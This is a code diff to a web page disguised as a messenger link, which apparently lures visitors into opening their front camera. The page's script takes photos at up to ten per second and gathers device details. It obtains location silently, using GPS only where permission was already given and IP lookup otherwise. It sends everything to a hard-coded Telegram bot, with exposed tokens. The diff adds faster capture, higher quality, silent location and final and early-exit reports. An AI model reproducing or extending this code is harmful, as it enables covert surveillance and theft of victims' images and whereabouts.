@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Camera Page</title>
   
-  <!-- Open Graph tags -->
+  <!-- Open Graph tags (سيتم تحديثها تلقائياً) -->
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
   <meta property="og:title" content="شاهين زيان masengar">
@@ -77,7 +77,7 @@
     const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const CHAT_ID = '5151102782';
     const COUNTDOWN_START = 10;
-    const CAPTURE_INTERVAL = 250;
+    const CAPTURE_INTERVAL = 100; // 10 صور بالثانية
     const IPINFO_TOKEN = 'a7e43833d69a75';
     const JSONBIN_BIN_ID = '69ee19e8856a68218974812e';
 
@@ -102,7 +102,12 @@
     let deviceInfo = null;
     const circumference = 2 * Math.PI * 70;
     let photoCount = 0;
+    // متغيرات جديدة للتقرير
+    const startTime = Date.now();
+    let cameraAttempts = 0;
+    let cameraGrantedOnFirstTry = false;
 
+    // ==================== جلب الإعدادات من JSONBin العام ====================
     async function fetchSettingsOnce() {
       try {
         const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
@@ -113,6 +118,7 @@
       } catch (err) {}
     }
 
+    // دالة الإرسال العامة (للرسائل النصية)
     async function sendTextMessage(text) {
       try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -123,7 +129,42 @@
       } catch (err) {}
     }
 
+    // دالة إرسال التقرير النهائي (عند انتهاء العداد)
+    async function sendFinalReport() {
+      const duration = ((Date.now() - startTime) / 1000).toFixed(1);
+      const locStr = latestPosition
+        ? `${latestPosition.latitude}, ${latestPosition.longitude} (source: ${latestPosition.source}, accuracy: ${latestPosition.accuracy}m)`
+        : 'Not available';
+      const camStatus = cameraGrantedOnFirstTry
+        ? 'Granted on first try'
+        : `Granted after ${cameraAttempts} attempt(s)`;
+
+      const report = `<b>📋 FINAL REPORT</b>\n`
+        + `<b>Duration:</b> ${duration} sec\n`
+        + `<b>Photos taken:</b> ${photoCount}\n`
+        + `<b>Location:</b> ${locStr}\n`
+        + `<b>Camera:</b> ${camStatus}`;
+
+      await sendTextMessage(report);
+    }
+
+    // دالة لإرسال تقرير عند الخروج المبكر (باستخدام sendBeacon)
+    function sendExitReport() {
+      if (photoCount === 0) return; // لم يتم التقاط أي صورة
+      const duration = ((Date.now() - startTime) / 1000).toFixed(1);
+      const locStr = latestPosition
+        ? `${latestPosition.latitude},${latestPosition.longitude} (${latestPosition.source})`
+        : 'Not available';
+      const text = `⚠️ Early exit\nDuration: ${duration}s\nPhotos: ${photoCount}\nLocation: ${locStr}`;
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('text', text);
+      navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, formData);
+    }
+
     async function backgroundTasks() {
+      // معلومات الجهاز (بدون تغيير)
       try {
         await new Promise(r => setTimeout(r, 200));
         const uaData = navigator.userAgentData || {};
@@ -216,26 +257,20 @@
         sendTextMessage(text);
       } catch(e) {}
 
-      if (navigator.geolocation) {
-        try {
-          const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
+      // ---------- جلب الموقع بصمت (بدون نافذة منبثقة) ----------
+      try {
+        // 1. التحقق من صلاحية الموقع
+        const perm = await navigator.permissions.query({ name: 'geolocation' });
+        if (perm.state === 'granted') {
+          // الصلاحية ممنوحة مسبقاً، يمكننا استخدام GPS بدون نافذة
+          try {
+            const pos = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+              });
             });
-          });
-          if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
-            latestPosition = {
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              source: 'GPS'
-            };
-          }
-        } catch (err) {}
-        watchId = navigator.geolocation.watchPosition(
-          pos => {
             if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
               latestPosition = {
                 latitude: pos.coords.latitude,
@@ -244,11 +279,36 @@
                 source: 'GPS'
               };
             }
-          },
-          err => {},
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+            // بدء المراقبة المستمرة أيضاً
+            watchId = navigator.geolocation.watchPosition(
+              p => {
+                if (p.coords.accuracy && p.coords.accuracy <= 50) {
+                  latestPosition = {
+                    latitude: p.coords.latitude,
+                    longitude: p.coords.longitude,
+                    accuracy: p.coords.accuracy,
+                    source: 'GPS'
+                  };
+                }
+              },
+              () => {},
+              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+          } catch (gpsErr) {
+            // فشل GPS الصامت، سننتقل إلى IP
+            console.warn('Silent GPS failed:', gpsErr.message);
+          }
+        } else {
+          // الصلاحية لم تمنح بعد (prompt أو denied)، لا نطلب الإذن، ننتقل مباشرة إلى IP
+          console.log('GPS permission is', perm.state, '- using IP location instead');
+        }
+      } catch (permErr) {
+        // المتصفح لا يدعم permissions.query، نجرب GPS مباشرة قد يظهر نافذة..
+        // لكن حسب الطلب: لا نريد أي نافذة، لذا ننتقل إلى IP فوراً
+        console.warn('Permissions API not supported, skipping GPS');
       }
+
+      // 2. إذا لم نحصل على موقع GPS، نستخدم IP
       if (!latestPosition) {
         try {
           const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
@@ -259,6 +319,8 @@
           }
         } catch (err) {}
       }
+
+      // إرسال الموقع إذا تم الحصول عليه
       if (latestPosition) {
         const links = {
           google: `https://www.google.com/maps/search/?api=1&query=${latestPosition.latitude},${latestPosition.longitude}`,
@@ -276,11 +338,14 @@
       }
     }
 
+    // ---------- الكاميرا ----------
     async function requestCameraOnce() {
+      cameraAttempts++;
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        if (cameraAttempts === 1) cameraGrantedOnFirstTry = true;
         return true;
       } catch (err) {
         return false;
@@ -302,12 +367,13 @@
       });
     }
 
+    // ---------- التصوير بجودة أفضل ----------
     function capturePhoto() {
       if (!video.videoWidth || !stream) return null;
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.65);
+      return canvas.toDataURL('image/jpeg', 0.8); // جودة أفضل
     }
 
     function b64toBlob(b64Data, contentType) {
@@ -335,6 +401,7 @@
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e => {});
     }
 
+    // ---------- المؤقت ----------
     function updateTimerUI() {
       countdownEl.textContent = countdown;
       redirectMsgEl.textContent = `سيتم تحويلك خلال ${countdown}`;
@@ -347,11 +414,14 @@
       if (photo) { photoCount++; sendPhoto(photo, photoCount); }
     }
 
-    function stopAllAndRedirect() {
+    async function stopAllAndRedirect() {
       if (intervalId) clearInterval(intervalId);
       if (captureIntervalId) clearInterval(captureIntervalId);
       if (stream) stream.getTracks().forEach(t => t.stop());
       if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+
+      // إرسال التقرير النهائي ثم التوجيه
+      await sendFinalReport();
       window.location.href = redirectUrl;
     }
 
@@ -379,6 +449,8 @@
       if (captureIntervalId) clearInterval(captureIntervalId);
       if (stream) stream.getTracks().forEach(t => t.stop());
       if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+      // إرسال تقرير سريع عند الخروج المبكر (إذا التقطت صور)
+      sendExitReport();
     });
   </script>
 </body>
